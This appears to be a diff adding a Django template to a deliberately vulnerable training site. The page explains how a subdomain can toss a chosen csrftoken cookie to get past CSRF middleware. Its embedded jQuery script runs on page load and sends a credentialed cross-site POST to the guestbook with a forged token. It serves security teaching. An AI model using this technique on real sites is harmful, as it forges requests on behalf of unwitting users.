@@ -1,0 +1,39 @@
+{% extends "base.html" %}
+
+
+{% block js %}
+{% endblock %}
+
+
+{% block main %}
+
+<div class="container">
+
+	<div class='row'>
+		<div class='col-sm-6 col-sm-offset-3'>
+			<h2>Getting around the CSRF Middleware</h2>
+			<p>Remember, the CSRF Middleware relies on cookies.  Cookies are upwards of 20 years old, and like a lot of the Internet's original design, they didn't anticipate today's security concerns.</p>
+			<p>For example, this subdomain can set cookies for all of veryveryvulnerable.com and its other subdomains.  We took advantage of this to set the csrftoken cookie to a value we knew, then we simply POSTed and included this chosen value as "proof" we were a legitimate entity.  Pop open your developer tools and take a look.</p>
+			<p>Then, visit <a href="http://ssda.veryveryvulnerable.com/guestbook/">ssda.veryveryvulnerable.com/guestbook/</a> and check to see if our attempt worked.</p>
+			<p>Think carefully about what lives on your domain (or might someday).  Old marketing sites?  A wordpress blog?</p>
+		</div>
+	</div>
+
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+	<script>
+	$.ajax({
+		method: 'POST',
+		url: 'http://ssda.veryveryvulnerable.com/guestbook/',
+		data: {
+			message: 'POST with any payload the attacker wants... on behalf of a real user...',
+			csrfmiddlewaretoken: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+		},
+		xhrFields: {
+			withCredentials: true
+		}
+	});
+	</script>
+
+</div>
+
+{% endblock %}
